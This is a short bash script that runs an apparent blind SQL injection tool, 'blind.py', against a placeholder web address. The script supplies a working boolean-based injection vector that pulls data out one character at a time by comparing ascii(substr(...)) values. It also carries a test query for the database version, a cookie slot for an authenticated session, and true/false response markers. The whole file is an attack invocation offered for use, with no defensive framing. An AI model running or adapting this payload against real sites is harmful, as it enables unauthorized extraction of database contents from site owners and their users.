#!/bin/bash

python blind.py \
--target="http://sub.domain.tld/path/file.ext?sqli={}" \
--vector="' or case when (ascii(substr(({query}),{inc},1))<{search}) then 1 else 0 end and '1'='1" \
--query="select version()" \
--cookie="COOKIE=VALUE;" \
--regex-true="string exists if condition is true" \
--regex-false="string exists if condition is false" \
--exploit=boolean
